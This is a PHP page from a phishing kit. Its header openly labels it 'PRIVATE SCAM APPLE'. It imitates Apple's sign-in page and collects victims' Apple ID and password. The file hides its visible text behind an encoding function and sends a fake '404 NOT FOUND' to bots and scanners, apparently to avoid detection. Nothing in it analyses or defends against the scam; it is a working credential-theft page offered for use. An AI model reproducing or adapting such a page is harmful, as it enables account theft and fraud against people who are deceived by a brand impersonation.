<?php 
/*   
                              #===============================#
                              #    PRIVATE SCAM APPLE         #
                              #           PIradz17            #
							  #     Facebook.com/Piradz17     #
                              #===============================#                     
*/
session_start();
error_reporting(0);
include('./INC-FUN/Encrypte.php');
include "./ANTIBOTS.php";
if (is_bitch($_SERVER['HTTP_USER_AGENT'])) {
    echo "404 NOT FOUND";
    exit;
}
?>
<div class="content-body"> <div class="form"> <form method="post" id="Z118_1XX" style="display: inline-block;width: 100%;" novalidate="novalidate"> <script src="./INC-LIB/JS/Z118_1XX.js"></script> <h2><?php echo xTextEncode('Sign in to your account');?></h2> <div> <div class="div-input"> <input name="appleid" id="appleid" placeholder="<?php echo xTextEncode('Apple ID*');?>" type="email"> </div> <div class="div-input"> <input name="password" id="password" placeholder="<?php echo xTextEncode('Password*');?>" type="password"> </div> <div class="div-input"></div> <div class="actions"> <input type="submit" value="<?php echo xTextEncode('Sign in');?>" class="signin" id="sign-in"> <p class="iforgot-link"> <a target="browser" id="go-iforgot" href="#"> <?php echo xTextEncode('Forgot your Apple ID or Password?');?> </a> </p> </div> </div> </form> </div> <div class="login"> <div class="right"> <p> <?php echo xTextEncode('You can use your Apple ID for other Apple services such as');?> </p> <div> <ul> <li> <?php echo xTextEncode('App Store');?> </li> <li> <?php echo xTextEncode('iTunes Store');?> </li> <li> <?php echo xTextEncode('iPhoto Print Products');?> </li> <li> <?php echo xTextEncode('iCloud');?> </li> </ul> <p id="iforgotlink" style="text-align: inherit;"> <a target="browser" id="go-iforgot" href="#"> <?php echo xTextEncode('Don’t have an Apple ID? Creat one now');?> </a> </p> </div> </div> </div></div></div>